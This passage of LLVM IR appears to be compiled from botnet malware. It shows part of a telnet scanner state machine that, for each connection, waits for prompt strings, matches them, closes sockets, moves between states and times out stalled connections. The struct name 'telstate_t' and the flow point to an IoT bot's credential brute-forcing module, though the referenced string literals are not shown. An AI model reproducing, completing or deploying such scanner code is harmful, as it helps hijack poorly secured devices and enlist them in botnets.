  %1522 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1521
  %1523 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1522, i32 0, i32 2
  store i8 0, i8* %1523, align 8
  %1524 = load i32, i32* %2, align 4
  %1525 = sext i32 %1524 to i64
  %1526 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1525
  %1527 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1526, i32 0, i32 3
  store i8 0, i8* %1527, align 1
  br label %2271

1528:                                             ; preds = %1492
  %1529 = load i32, i32* %2, align 4
  %1530 = sext i32 %1529 to i64
  %1531 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1530
  %1532 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1531, i32 0, i32 2
  store i8 7, i8* %1532, align 8
  br label %1533

1533:                                             ; preds = %1528
  %1534 = load i32, i32* %2, align 4
  %1535 = sext i32 %1534 to i64
  %1536 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1535
  %1537 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1536, i32 0, i32 8
  %1538 = load i8*, i8** %1537, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1538, i8 0, i64 1024, i1 false)
  br label %2271

1539:                                             ; preds = %1473
  %1540 = load i32, i32* %2, align 4
  %1541 = sext i32 %1540 to i64
  %1542 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1541
  %1543 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1542, i32 0, i32 0
  %1544 = load i32, i32* %1543, align 16
  %1545 = load i32, i32* %2, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1547, i32 0, i32 8
  %1549 = load i8*, i8** %1548, align 8
  %1550 = load i32, i32* %2, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1551
  %1553 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1552, i32 0, i32 7
  %1554 = load i16, i16* %1553, align 16
  %1555 = zext i16 %1554 to i32
  %1556 = call i32 @readUntil(i32 %1544, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1549, i32 1024, i32 %1555)
  %1557 = icmp ne i32 %1556, 0
  br i1 %1557, label %1558, label %1605

1558:                                             ; preds = %1539
  %1559 = load i32, i32* %2, align 4
  %1560 = sext i32 %1559 to i64
  %1561 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1560
  %1562 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1561, i32 0, i32 6
  store i32 0, i32* %1562, align 4
  %1563 = load i32, i32* %2, align 4
  %1564 = sext i32 %1563 to i64
  %1565 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1564
  %1566 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1565, i32 0, i32 7
  store i16 0, i16* %1566, align 16
  %1567 = load i32, i32* %2, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1568
  %1570 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1569, i32 0, i32 8
  %1571 = load i8*, i8** %1570, align 8
  %1572 = call i8* @strstr(i8* %1571, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0)) #11
  %1573 = icmp ne i8* %1572, null
  br i1 %1573, label %1574, label %1594

1574:                                             ; preds = %1558
  %1575 = load i32, i32* %2, align 4
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1576
  %1578 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1577, i32 0, i32 8
  %1579 = load i8*, i8** %1578, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1579, i8 0, i64 1024, i1 false)
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1582, i32 0, i32 0
  %1584 = load i32, i32* %1583, align 16
  %1585 = call i32 @sclose(i32 %1584)
  %1586 = load i32, i32* %2, align 4
  %1587 = sext i32 %1586 to i64
  %1588 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1587
  %1589 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1588, i32 0, i32 2
  store i8 0, i8* %1589, align 8
  %1590 = load i32, i32* %2, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1591
  %1593 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1592, i32 0, i32 3
  store i8 0, i8* %1593, align 1
  br label %2271

1594:                                             ; preds = %1558
  %1595 = load i32, i32* %2, align 4
  %1596 = sext i32 %1595 to i64
  %1597 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1596
  %1598 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1597, i32 0, i32 2
  store i8 7, i8* %1598, align 8
  br label %1599

1599:                                             ; preds = %1594
  %1600 = load i32, i32* %2, align 4
  %1601 = sext i32 %1600 to i64
  %1602 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1601
  %1603 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1602, i32 0, i32 8
  %1604 = load i8*, i8** %1603, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1604, i8 0, i64 1024, i1 false)
  br label %2271

1605:                                             ; preds = %1539
  %1606 = load i32, i32* %2, align 4
  %1607 = sext i32 %1606 to i64
  %1608 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1607
  %1609 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1608, i32 0, i32 0
  %1610 = load i32, i32* %1609, align 16
  %1611 = load i32, i32* %2, align 4
  %1612 = sext i32 %1611 to i64
  %1613 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1613, i32 0, i32 8
  %1615 = load i8*, i8** %1614, align 8
  %1616 = load i32, i32* %2, align 4
  %1617 = sext i32 %1616 to i64
  %1618 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1617
  %1619 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1618, i32 0, i32 7
  %1620 = load i16, i16* %1619, align 16
  %1621 = zext i16 %1620 to i32
  %1622 = call i32 @readUntil(i32 %1610, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1615, i32 1024, i32 %1621)
  %1623 = icmp ne i32 %1622, 0
  br i1 %1623, label %1624, label %1671

1624:                                             ; preds = %1605
  %1625 = load i32, i32* %2, align 4
  %1626 = sext i32 %1625 to i64
  %1627 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1627, i32 0, i32 6
  store i32 0, i32* %1628, align 4
  %1629 = load i32, i32* %2, align 4
  %1630 = sext i32 %1629 to i64
  %1631 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1630
  %1632 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1631, i32 0, i32 7
  store i16 0, i16* %1632, align 16
  %1633 = load i32, i32* %2, align 4
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1634
  %1636 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1635, i32 0, i32 8
  %1637 = load i8*, i8** %1636, align 8
  %1638 = call i8* @strstr(i8* %1637, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i64 0, i64 0)) #11
  %1639 = icmp ne i8* %1638, null
  br i1 %1639, label %1640, label %1660

1640:                                             ; preds = %1624
  %1641 = load i32, i32* %2, align 4
  %1642 = sext i32 %1641 to i64
  %1643 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1642
  %1644 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1643, i32 0, i32 8
  %1645 = load i8*, i8** %1644, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1645, i8 0, i64 1024, i1 false)
  %1646 = load i32, i32* %2, align 4
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1647
  %1649 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1648, i32 0, i32 0
  %1650 = load i32, i32* %1649, align 16
  %1651 = call i32 @sclose(i32 %1650)
  %1652 = load i32, i32* %2, align 4
  %1653 = sext i32 %1652 to i64
  %1654 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1653
  %1655 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1654, i32 0, i32 2
  store i8 0, i8* %1655, align 8
  %1656 = load i32, i32* %2, align 4
  %1657 = sext i32 %1656 to i64
  %1658 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1657
  %1659 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1658, i32 0, i32 3
  store i8 0, i8* %1659, align 1
  br label %2271

1660:                                             ; preds = %1624
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %1663 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1663, i32 0, i32 2
  store i8 7, i8* %1664, align 8
  br label %1665

1665:                                             ; preds = %1660
  %1666 = load i32, i32* %2, align 4
  %1667 = sext i32 %1666 to i64
  %1668 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1667
  %1669 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1668, i32 0, i32 8
  %1670 = load i8*, i8** %1669, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1670, i8 0, i64 1024, i1 false)
  br label %2271

1671:                                             ; preds = %1605
  %1672 = load i32, i32* %2, align 4
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1673
  %1675 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1674, i32 0, i32 0
  %1676 = load i32, i32* %1675, align 16
  %1677 = load i32, i32* %2, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1678
  %1680 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1679, i32 0, i32 8
  %1681 = load i8*, i8** %1680, align 8
  %1682 = load i32, i32* %2, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1684, i32 0, i32 7
  %1686 = load i16, i16* %1685, align 16
  %1687 = zext i16 %1686 to i32
  %1688 = call i32 @readUntil(i32 %1676, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1681, i32 1024, i32 %1687)
  %1689 = icmp ne i32 %1688, 0
  br i1 %1689, label %1690, label %1737

1690:                                             ; preds = %1671
  %1691 = load i32, i32* %2, align 4
  %1692 = sext i32 %1691 to i64
  %1693 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1692
  %1694 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1693, i32 0, i32 6
  store i32 0, i32* %1694, align 4
  %1695 = load i32, i32* %2, align 4
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1696
  %1698 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1697, i32 0, i32 7
  store i16 0, i16* %1698, align 16
  %1699 = load i32, i32* %2, align 4
  %1700 = sext i32 %1699 to i64
  %1701 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1700
  %1702 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1701, i32 0, i32 8
  %1703 = load i8*, i8** %1702, align 8
  %1704 = call i8* @strstr(i8* %1703, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i64 0, i64 0)) #11
  %1705 = icmp ne i8* %1704, null
  br i1 %1705, label %1706, label %1726

1706:                                             ; preds = %1690
  %1707 = load i32, i32* %2, align 4
  %1708 = sext i32 %1707 to i64
  %1709 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1708
  %1710 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1709, i32 0, i32 8
  %1711 = load i8*, i8** %1710, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1711, i8 0, i64 1024, i1 false)
  %1712 = load i32, i32* %2, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1713
  %1715 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1714, i32 0, i32 0
  %1716 = load i32, i32* %1715, align 16
  %1717 = call i32 @sclose(i32 %1716)
  %1718 = load i32, i32* %2, align 4
  %1719 = sext i32 %1718 to i64
  %1720 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1719
  %1721 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1720, i32 0, i32 2
  store i8 0, i8* %1721, align 8
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1724, i32 0, i32 3
  store i8 0, i8* %1725, align 1
  br label %2271

1726:                                             ; preds = %1690
  %1727 = load i32, i32* %2, align 4
  %1728 = sext i32 %1727 to i64
  %1729 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1728
  %1730 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1729, i32 0, i32 2
  store i8 7, i8* %1730, align 8
  br label %1731

1731:                                             ; preds = %1726
  %1732 = load i32, i32* %2, align 4
  %1733 = sext i32 %1732 to i64
  %1734 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1733
  %1735 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1734, i32 0, i32 8
  %1736 = load i8*, i8** %1735, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1736, i8 0, i64 1024, i1 false)
  br label %2271

1737:                                             ; preds = %1671
  %1738 = load i32, i32* %2, align 4
  %1739 = sext i32 %1738 to i64
  %1740 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1739
  %1741 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1740, i32 0, i32 0
  %1742 = load i32, i32* %1741, align 16
  %1743 = load i32, i32* %2, align 4
  %1744 = sext i32 %1743 to i64
  %1745 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1744
  %1746 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1745, i32 0, i32 8
  %1747 = load i8*, i8** %1746, align 8
  %1748 = load i32, i32* %2, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1749
  %1751 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1750, i32 0, i32 7
  %1752 = load i16, i16* %1751, align 16
  %1753 = zext i16 %1752 to i32
  %1754 = call i32 @readUntil(i32 %1742, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1747, i32 1024, i32 %1753)
  %1755 = icmp ne i32 %1754, 0
  br i1 %1755, label %1756, label %1803

1756:                                             ; preds = %1737
  %1757 = load i32, i32* %2, align 4
  %1758 = sext i32 %1757 to i64
  %1759 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1758
  %1760 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1759, i32 0, i32 6
  store i32 0, i32* %1760, align 4
  %1761 = load i32, i32* %2, align 4
  %1762 = sext i32 %1761 to i64
  %1763 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1762
  %1764 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1763, i32 0, i32 7
  store i16 0, i16* %1764, align 16
  %1765 = load i32, i32* %2, align 4
  %1766 = sext i32 %1765 to i64
  %1767 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1766
  %1768 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1767, i32 0, i32 8
  %1769 = load i8*, i8** %1768, align 8
  %1770 = call i8* @strstr(i8* %1769, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i64 0, i64 0)) #11
  %1771 = icmp ne i8* %1770, null
  br i1 %1771, label %1772, label %1792

1772:                                             ; preds = %1756
  %1773 = load i32, i32* %2, align 4
  %1774 = sext i32 %1773 to i64
  %1775 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1775, i32 0, i32 8
  %1777 = load i8*, i8** %1776, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1777, i8 0, i64 1024, i1 false)
  %1778 = load i32, i32* %2, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1780, i32 0, i32 0
  %1782 = load i32, i32* %1781, align 16
  %1783 = call i32 @sclose(i32 %1782)
  %1784 = load i32, i32* %2, align 4
  %1785 = sext i32 %1784 to i64
  %1786 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1785
  %1787 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1786, i32 0, i32 2
  store i8 0, i8* %1787, align 8
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1790, i32 0, i32 3
  store i8 0, i8* %1791, align 1
  br label %2271

1792:                                             ; preds = %1756
  %1793 = load i32, i32* %2, align 4
  %1794 = sext i32 %1793 to i64
  %1795 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1794
  %1796 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1795, i32 0, i32 2
  store i8 7, i8* %1796, align 8
  br label %1797

1797:                                             ; preds = %1792
  %1798 = load i32, i32* %2, align 4
  %1799 = sext i32 %1798 to i64
  %1800 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1799
  %1801 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1800, i32 0, i32 8
  %1802 = load i8*, i8** %1801, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1802, i8 0, i64 1024, i1 false)
  br label %2271

1803:                                             ; preds = %1737
  %1804 = load i32, i32* %2, align 4
  %1805 = sext i32 %1804 to i64
  %1806 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1805
  %1807 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1806, i32 0, i32 0
  %1808 = load i32, i32* %1807, align 16
  %1809 = load i32, i32* %2, align 4
  %1810 = sext i32 %1809 to i64
  %1811 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1810
  %1812 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1811, i32 0, i32 8
  %1813 = load i8*, i8** %1812, align 8
  %1814 = load i32, i32* %2, align 4
  %1815 = sext i32 %1814 to i64
  %1816 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1815
  %1817 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1816, i32 0, i32 7
  %1818 = load i16, i16* %1817, align 16
  %1819 = zext i16 %1818 to i32
  %1820 = call i32 @readUntil(i32 %1808, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0), i32 1, i32 0, i32 10000, i8* %1813, i32 1024, i32 %1819)
  %1821 = icmp ne i32 %1820, 0
  br i1 %1821, label %1822, label %1869

1822:                                             ; preds = %1803
  %1823 = load i32, i32* %2, align 4
  %1824 = sext i32 %1823 to i64
  %1825 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1824
  %1826 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1825, i32 0, i32 6
  store i32 0, i32* %1826, align 4
  %1827 = load i32, i32* %2, align 4
  %1828 = sext i32 %1827 to i64
  %1829 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1828
  %1830 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1829, i32 0, i32 7
  store i16 0, i16* %1830, align 16
  %1831 = load i32, i32* %2, align 4
  %1832 = sext i32 %1831 to i64
  %1833 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1832
  %1834 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1833, i32 0, i32 8
  %1835 = load i8*, i8** %1834, align 8
  %1836 = call i8* @strstr(i8* %1835, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i64 0, i64 0)) #11
  %1837 = icmp ne i8* %1836, null
  br i1 %1837, label %1838, label %1858

1838:                                             ; preds = %1822
  %1839 = load i32, i32* %2, align 4
  %1840 = sext i32 %1839 to i64
  %1841 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1840
  %1842 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1841, i32 0, i32 8
  %1843 = load i8*, i8** %1842, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1843, i8 0, i64 1024, i1 false)
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %1846 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1846, i32 0, i32 0
  %1848 = load i32, i32* %1847, align 16
  %1849 = call i32 @sclose(i32 %1848)
  %1850 = load i32, i32* %2, align 4
  %1851 = sext i32 %1850 to i64
  %1852 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1851
  %1853 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1852, i32 0, i32 2
  store i8 0, i8* %1853, align 8
  %1854 = load i32, i32* %2, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1855
  %1857 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1856, i32 0, i32 3
  store i8 0, i8* %1857, align 1
  br label %2271

1858:                                             ; preds = %1822
  %1859 = load i32, i32* %2, align 4
  %1860 = sext i32 %1859 to i64
  %1861 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1860
  %1862 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1861, i32 0, i32 2
  store i8 7, i8* %1862, align 8
  br label %1863

1863:                                             ; preds = %1858
  %1864 = load i32, i32* %2, align 4
  %1865 = sext i32 %1864 to i64
  %1866 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1865
  %1867 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1866, i32 0, i32 8
  %1868 = load i8*, i8** %1867, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %1868, i8 0, i64 1024, i1 false)
  br label %2271

1869:                                             ; preds = %1803
  %1870 = load i32, i32* %2, align 4
  %1871 = sext i32 %1870 to i64
  %1872 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1871
  %1873 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1872, i32 0, i32 8
  %1874 = load i8*, i8** %1873, align 8
  %1875 = call i64 @strlen(i8* %1874) #11
  %1876 = trunc i64 %1875 to i16
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1879, i32 0, i32 7
  store i16 %1876, i16* %1880, align 16
  br label %1881

1881:                                             ; preds = %1869
  %1882 = load i32, i32* %2, align 4
  %1883 = sext i32 %1882 to i64
  %1884 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1883
  %1885 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1884, i32 0, i32 6
  %1886 = load i32, i32* %1885, align 4
  %1887 = add i32 %1886, 10
  %1888 = zext i32 %1887 to i64
  %1889 = call i64 @time(i64* null) #12
  %1890 = icmp slt i64 %1888, %1889
  br i1 %1890, label %1891, label %1906

1891:                                             ; preds = %1881
  %1892 = load i32, i32* %2, align 4
  %1893 = sext i32 %1892 to i64
  %1894 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1893
  %1895 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1894, i32 0, i32 0
  %1896 = load i32, i32* %1895, align 16
  %1897 = call i32 @sclose(i32 %1896)
  %1898 = load i32, i32* %2, align 4
  %1899 = sext i32 %1898 to i64
  %1900 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1899
  %1901 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1900, i32 0, i32 2
  store i8 0, i8* %1901, align 8
  %1902 = load i32, i32* %2, align 4
  %1903 = sext i32 %1902 to i64
  %1904 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1903
  %1905 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1904, i32 0, i32 3
  store i8 1, i8* %1905, align 1
  br label %1906

1906:                                             ; preds = %1891, %1881
  br label %2270

1907:                                             ; preds = %69
  %1908 = load i32, i32* %2, align 4
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1909
  %1911 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1910, i32 0, i32 0
  %1912 = load i32, i32* %1911, align 16
  %1913 = call i64 @send(i32 %1912, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0), i64 4, i32 16384)
  %1914 = icmp slt i64 %1913, 0
  br i1 %1914, label %1915, label %1930

1915:                                             ; preds = %1907
  %1916 = load i32, i32* %2, align 4
  %1917 = sext i32 %1916 to i64
  %1918 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1918, i32 0, i32 0
  %1920 = load i32, i32* %1919, align 16
  %1921 = call i32 @sclose(i32 %1920)
  %1922 = load i32, i32* %2, align 4
  %1923 = sext i32 %1922 to i64
  %1924 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1923
  %1925 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1924, i32 0, i32 2
  store i8 0, i8* %1925, align 8
  %1926 = load i32, i32* %2, align 4
  %1927 = sext i32 %1926 to i64
  %1928 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1927
  %1929 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1928, i32 0, i32 3
  store i8 1, i8* %1929, align 1
  br label %2271

1930:                                             ; preds = %1907
  %1931 = load i32, i32* %2, align 4
  %1932 = sext i32 %1931 to i64
  %1933 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %33, i64 %1932
  %1934 = getelementptr inbounds %struct.telstate_t.1, %struct.telstate_t.1* %1933, i32 0, i32 2
  store i8 8, i8* %1934, align 8
